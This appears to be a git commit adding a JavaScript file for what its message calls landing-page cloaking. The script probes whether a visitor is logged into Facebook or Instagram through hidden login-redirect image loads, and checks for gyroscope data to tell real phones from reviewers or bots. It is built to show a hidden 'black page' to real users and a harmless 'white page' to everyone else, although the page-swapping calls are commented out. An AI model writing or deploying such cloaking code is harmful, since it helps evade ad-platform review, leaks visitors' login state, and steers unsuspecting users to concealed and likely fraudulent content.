6449196e59174454c02461442796358191831712
Ruslan Androsenko <ruslan.developer.89@gmail.com>
2019-10-27 21:41:32 +0300

    Landing cloacking 1.0.0

---
+++ js/scripts.js
@@ -0,0 +1,73 @@
+"use strict";
+
+var counter = 0;
+
+$(function(){
+	window.addEventListener('deviceorientation', onOrientationChange);
+
+	var arData = {
+		facebook: {
+			url: "https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico",
+			name: "facebook"
+		},
+
+		instagram: {
+			url: "https://www.instagram.com/accounts/login/?next=%2Ffavicon.ico",
+			name: "instagram"
+		},
+	};
+
+
+	for (var key in arData) {
+		var item = arData[key];
+		var image = '<img class="icon-image" src="' + item.url + '" onload="refresh(\'' + item.name + '\')" onerror="error(\'' + item.name + '\')" style="display: none;" />';
+
+		$("#include_data").append(image);
+	} // for in
+
+
+	$("#include_data").remove();
+	$("#remove_script").remove();
+});
+
+
+function onOrientationChange(e) {
+	var alpha = Math.round(e.alpha);
+	var beta = Math.round(e.beta);
+	var gamma = Math.round(e.gamma);
+
+	if((alpha || beta || gamma) && counter < 1){
+		counter++;
+
+		showMessage("load system: giroscop");
+		// document.location.href += "black_land";
+
+		// $.post("php/worked_2_4.php", {request: "blackPage", state: "logged", system: "giroscop"}, function (data) {
+		// 	$("#page_content").html(data);
+		// });
+	} // if
+} // onOrientationChange
+
+function refresh(system) {
+	showMessage("refresh load system: " + system);
+
+	// document.location.href += "black_land";
+
+	// $.post("php/worked_2_4.php", {request: "blackPage", state: "logged", system: system}, function (data) {
+	// 	$("#page_content").html(data);
+	// });
+} // refresh
+
+function error(system) {
+	showMessage("error system: " + system);
+
+	// $.post("php/worked_2_4.php", {request: "whitePage", state: "not logged", system: system}, function (data) {
+	// 	$("#page_content").html(data);
+	// });
+} // error
+
+
+function showMessage(text){
+	console.log(text);
+	alert(text);
+} // showMessage
